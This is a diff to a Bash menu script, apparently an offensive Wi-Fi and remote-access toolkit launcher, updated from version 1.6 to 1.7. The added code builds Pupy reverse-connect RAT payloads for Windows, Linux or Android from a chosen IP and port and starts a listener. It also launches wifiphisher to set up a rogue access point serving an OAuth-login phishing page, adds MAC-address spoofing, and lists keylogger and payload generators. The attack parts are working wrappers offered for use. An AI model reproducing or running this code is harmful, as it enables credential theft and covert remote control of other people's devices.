@@ -1,5 +1,5 @@
 #! /bin/bash
-VERSION=1.6
+VERSION=1.7
 #############DEFAULTS###############
 #setting yellow-start 
 YS="\e[1;33m"
@@ -169,6 +169,7 @@ clear
 				echo -e ""$YS"18"$CE") Mdk3-master        Tries to reboot the AP and unlock the WPS lock"
 				echo -e ""$YS"19"$CE") Katana Framework   Many penetration testing features"
 				echo -e ""$YS"20"$CE") Airgeddon          Evil twin-WPA WPA2-WEP-WPS and more"
+				echo -e ""$YS"21"$CE") Websploit          Wireless attack-multitool"
 				echo -e ""$YS"00"$CE") Main menu"
 				echo -e ""$YS" 0"$CE") EXIT"
 				echo -e "Choose: "
@@ -202,6 +203,11 @@ clear
 						clear
 						wifiphisher
 					fi
+				elif [ "$APPP" = "d3" ]
+				then
+					echo -e "Enter the name of the access point you want to create: "
+					read -e ESSIDAP
+					wifiphisher --nojamming --essid "$ESSIDAP" -p oauth-login
 				elif [ "$APPP" = "4" ]
 				then
 					if [ -d "/root/Zatacker" ]
@@ -346,6 +352,10 @@ clear
 					cd /root/airgeddon
 					./airgeddon.sh
 					cd
+				elif [ "$APPP" = "21" ]
+				then
+					clear
+					websploit
 				elif [ "$APPP" = "6" ]
 				then
 					clear	
@@ -420,8 +430,9 @@ clear
 			then
 				clear
 				echo -e "-------------------------"$RS"Remote access"$CE"---------------------------"
-				echo -e ""$YS" 1"$CE") BeeLogger		Generate keylogger"
-				echo -e ""$YS" 2"$CE") Ezsploit      Generate payloads for many platforms,listeners etc..."
+				echo -e ""$YS" 1"$CE") BeeLogger	Generate keylogger"
+				echo -e ""$YS" 2"$CE") Ezsploit	Generate payloads for many platforms,listeners etc..."
+				echo -e ""$YS" 3"$CE") Pupy      	Generate payloads for many platforms,listeners etc..."
 				echo -e ""$YS"00"$CE") Main menu"
 				echo -e ""$YS" 0"$CE") EXIT"
 				echo -e "Choose: "
@@ -448,6 +459,59 @@ clear
 					echo -e "Press "$YS"any key"$CE" to leave..."
 					read
 					exec bash "$0"
+				elif [ "$KEYLOG" = "3" ]
+				then
+					clear
+					echo -e ""$YS" 1"$CE") Generate a payload"
+					echo -e ""$YS" 2"$CE") Start listener"
+					echo -e ""$YS"00"$CE") Main menu"
+					echo -e ""$YS" 0"$CE") EXIT"
+					read -e PUPY
+					if [ "$PUPY" = "1" ]
+					then
+						clear
+						echo -e "Choose the target OS:"
+						echo -e ""$YS" 1"$CE") Windows"
+						echo -e ""$YS" 2"$CE") Linux"
+						echo -e ""$YS" 3"$CE") Android"
+						echo -e "Choose: "
+						read -e TAROS
+						if [ "$TAROS" = "1" ]
+						then
+							TAROS="windows"
+						elif [ "$TAROS" = "2" ]
+						then
+							TAROS="linux"
+						elif [ "$TAROS" = "3" ]
+						then
+							TAROS="android"
+						else
+							echo -e "Wrong choice.Returning to main manu..."
+							sleep 2
+							exec bash "$0"
+						fi
+						clear
+						echo -e "Enter your ip: "
+						read -e PUPYIP
+						clear
+						echo -e "Enter your port(etc: 443): "
+						read -e PUPYPORT
+						clear
+						echo -e "Enter the full output path(etc: /root/Desktop/payload1.exe)"
+						read -e PUPYPATH
+						cd /root/pupy/pupy
+						./pupygen.py -O $TAROS -o "$PUPYPATH" connect --host "$PUPYIP":"$PUPYPORT"
+					elif [ "$PUPY" = "2" ]
+					then
+						cd /root/pupy/pupy
+						./pupysh.py
+					elif [ "$PUPY" = "00" ]
+					then
+						exec bash "$0"
+					elif [ "$PUPY" = "0" ]
+					then
+						exit
+					fi
 				elif [ "$KEYLOG" = "00" ]
 				then
 					clear
@@ -518,11 +582,25 @@ clear
 	then
 		interface_selection
 		clear
-		echo -e "Changing mac address of $MYINT to a random one..."
-		ifconfig $MYINT down
-		macchanger -r $MYINT
-		ifconfig $MYINT up
-		echo -e "Done."
+		echo -e "Change it to a random or specific?("$YS"r"$CE"/"$YS"s"$CE")("$YS"Enter"$CE"=r): "
+		read -e RORS
+		clear
+		if [ "$RORS" != "s" ]
+		then
+			echo -e "Changing mac address of $MYINT to a random one..."
+			ifconfig $MYINT down
+			macchanger -r $MYINT
+			ifconfig $MYINT up
+			echo -e "Done."
+		else
+			echo -e "Enter the MAC you want:"
+			read -e SMAC
+			echo -e "Changing mac address of $MYINT to $SMAC..."
+			ifconfig $MYINT down
+			macchanger -m $SMAC $MYINT
+			ifconfig $MYINT up
+			echo -e "Done."
+		fi
 	elif [ "$YORNAA" = "d3" ]
 	then
 		interface_selection
@@ -606,7 +684,7 @@ clear
 			sleep 1
 			FJC=0
 			export FJC
-			gnome-terminal --geometry 80x25+9999+0 -e lh1
+			gnome-terminal --geometry 90x28+9999+0 -e lh1
 			sleep 1
 			exec bash "$0"
 			#~ gnome-terminal --geometry 80x25+0+0 -e l
@@ -779,6 +857,9 @@ clear
 			exit
 		fi
 		done
+	elif [ "$YORNAA" = "exit" ]
+	then
+		exit
 	elif [ "$YORNAA" = "update" ]
 	then
 		#----------update-check-----------
@@ -869,7 +950,7 @@ clear
 		echo -e "-----------------------------"$RS"ERRORS"$CE"------------------------------"
 		echo -e ""$YS" 1"$CE") Fix no audio issue"
 		echo -e ""$YS" 2"$CE") No output in wash"
-		#~ echo -e " 2) "
+		echo -e ""$YS" 3"$CE") No full screen"
 		echo -e ""$YS"00"$CE") Main menu"
 		echo -e ""$YS" 0"$CE") EXIT"
 		echo -e " Choose: "
@@ -912,6 +993,13 @@ clear
 			echo -e "Press "$YS"many key"$CE" to test wash"
 			echo -e "Also try "wash -i wlan0mon -a" to display all networks"
 			wash -i $INTWASH
+		elif [ "$ERRS" = "3" ]
+		then
+			apt-get install open-vm-tools-desktop fuse
+			echo -e "Restart your vistual machine..."
+			sleep 2
+			echo -e "$PAKTGB"
+			read
 		elif [ "$ERRS" = "0" ]
 		then
 			clear
@@ -931,10 +1019,10 @@ clear
 		#---------------------------------------------------------------------------------------------------------------------------
 	elif [ "$YORNAA" = "start" ]
 	then
-		echo -e "Changing MAC of eth0 to 00:11:22:33:44:55..."
-		ifconfig eth0 down
-		macchanger -m 00:11:22:33:44:55 eth0 | grep "New MAC:"
-		ifconfig eth0 up
+		#~ echo -e "Changing MAC of eth0 to 00:11:22:33:44:55..."
+		#~ ifconfig eth0 down
+		#~ macchanger -m 00:11:22:33:44:55 eth0 | grep "New MAC:"
+		#~ ifconfig eth0 up
 		echo -e "Enabling $WLANN..."
 		rfkill unblock wifi; rfkill unblock all
 		ifconfig $WLANN up
